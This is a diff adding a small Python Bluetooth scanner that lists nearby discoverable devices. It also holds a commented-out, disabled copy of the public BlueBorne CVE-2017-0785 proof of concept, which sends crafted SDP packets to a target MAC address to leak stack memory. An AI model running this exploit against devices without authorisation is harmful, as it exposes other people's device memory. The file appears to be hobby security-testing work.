@@ -1,0 +1,105 @@
+#! /usr/bin/env python3
+import pwn
+import socket
+import argparse
+import bluetooth
+
+#Testing blueborne code from https://github.com/ojasookert/CVE-2017-0785/blob/master/CVE-2017-0785.py
+def scanMAC(macAddr):
+    return None
+    # service_long = 0x0100
+    # service_short = 0x0001
+    # mtu = 50
+    # n = 30
+    #
+    # def packet(service, continuation_state):
+    #     pkt = '\x02\x00\x00'
+    #     pkt += str(pwn.p16(7 + len(continuation_state)))
+    #     pkt += '\x35\x03\x19'
+    #     pkt += str(pwn.p16(service))
+    #     pkt += '\x01\x00'
+    #     pkt += continuation_state
+    #     return pkt
+    #
+    # p = pwn.log.progress('Exploit')
+    # p.status('Creating L2CAP socket')
+    #
+    # sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+    # bluetooth.set_l2cap_mtu(sock, mtu)
+    # pwn.context.endian = 'big'
+    #
+    # p.status('Connecting to target')
+    # sock.connect((macAddr, 1))
+    #
+    # p.status('Sending packet 0')
+    # sock.send(packet(service_long, '\x00'))
+    # data = sock.recv(mtu)
+    #
+    # if data[-3] != '\x02':
+    #     pwn.log.error('Invalid continuation state received.')
+    #
+    # stack = ''
+    #
+    # for i in range(1, n):
+    #     p.status('Sending packet %d' % i)
+    #     sock.send(packet(service_short, data[-3:]))
+    #     data = sock.recv(mtu)
+    #     stack += data[9:-3]
+    #
+    # sock.close()
+    #
+    # p.success('Done')
+    #
+    # print(hexdump(stack))
+
+#Scans all nearby bluetooth devices, return list of MACS and Device Names(if available). Devices must be in discoverable mode. Does not work with low power Bluetooth
+def scanAll():
+    #Standard ble check
+    nearby_devices = bluetooth.discover_devices(lookup_names=True)
+
+    print(f'found {len(nearby_devices)}')
+
+    for addr, name in nearby_devices:
+        print(f'{addr}  -   {name}')
+
+#Verifies if input is a MAC address
+def isMACAddress(input):
+    if input.count(":")!=5:
+        return False
+    for section in input.split(":"):
+        for char in section:
+            if char>"F" or (char<"A" and not char.isdigit()) or len(section)!=2:
+                return False
+    return True
+
+#Parse arguments, verify valid format
+def parseArgs():
+    parser = argparse.ArgumentParser(description='Scan given MAC address for Bluetooth vulnerabilites, or scan for all bluetooth devices in range and in discovery mode.')
+    parser.add_argument('MAC', nargs='?', help='MAC Address of Bluetooth device to scan for vulnerabilites')
+
+    args = parser.parse_args();
+    if args.MAC is not None:
+        if isMACAddress(args.MAC):
+            return args.MAC
+        else:
+            print("Usage: BlueberryPi_v0.1 [XX:XX:XX:XX:XX:XX]")
+            exit(1)
+    else:
+        return None
+
+#Main section
+def main():
+
+    #Parse arguments
+    input = parseArgs();
+
+    #Stuff
+    if(input is not None):
+        scanMAC(input)
+    else:
+        scanAll()
+
+
+
+if __name__ == '__main__':
+    main()
